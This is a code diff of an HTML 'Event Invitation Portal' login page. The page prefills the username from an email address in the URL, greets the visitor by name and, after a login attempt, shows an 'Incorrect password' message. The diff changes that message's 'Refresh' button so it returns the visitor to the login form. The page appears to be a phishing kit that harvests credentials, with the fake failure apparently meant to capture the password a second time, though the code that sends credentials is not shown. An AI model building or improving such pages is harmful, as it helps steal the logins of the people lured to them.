@@ -148,31 +148,22 @@
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
-
-    <!-- ✅ Title updated dynamically -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
-
     <p class="subtext">Sign-in to continue</p>
-
     <input type="text" id="username" placeholder="Username" required>
     <input type="password" id="password" placeholder="Password" required>
-
     <button onclick="authenticate()">Login</button>
-
     <p class="note">
-      To improve the security of your account, we recommend that you enable sign-in alerts. We will notify you when we detect sign-in activity from a new browser, location, or device.
+To improve the security of your account, we recommend that you enable sign-in alerts. We will notify you when we detect sign-in activity from a new browser, location, or device.
     </p>
   </div>
 
   <!-- Confirmation Message -->
   <div id="confirmation">
-    <h2 style="color: white;">Password Incorrect</h2>
-    <p>
-      This password may be incorrect. Make sure you typed it correctly. Otherwise, try again by refreshing the page.
-    </p>
-<button onclick="window.location.href='/'">
-  Refresh
-</button>
+    <h2 style="color: white;">Incorrect password</h2>
+    <p>The password may be incorrect. Please refresh the page and try again.</p>
+    <!-- ✅ Updated button -->
+    <button onclick="goBackToLogin()">Refresh</button>
   </div>
 
   <!-- Footer -->
@@ -181,17 +172,15 @@
   </div>
 
   <script>
-    // ✅ Prefill username + show first name
+    // ✅ Prefill username + first name
     document.addEventListener("DOMContentLoaded", function () {
       const params = new URLSearchParams(window.location.search);
       const emailParam = params.get("email");
 
       function extractFirstName(email) {
         if (!email || !email.includes("@")) return "";
-
         let namePart = email.split("@")[0];
         namePart = namePart.split(/[.\-_]/)[0];
-
         return namePart.charAt(0).toUpperCase() + namePart.slice(1);
       }
 
@@ -204,7 +193,6 @@
           usernameField.value = decodedEmail;
 
           const firstName = extractFirstName(decodedEmail);
-
           if (firstName && title) {
             title.textContent = "Hi, " + firstName;
           }
@@ -252,6 +240,12 @@
         loginButton.disabled = false;
         loginButton.textContent = "Login";
       }
+    }
+
+    // ✅ New function to return to login
+    function goBackToLogin() {
+      document.getElementById("confirmation").style.display = "none";
+      document.getElementById("login").style.display = "block";
     }
   </script>
 
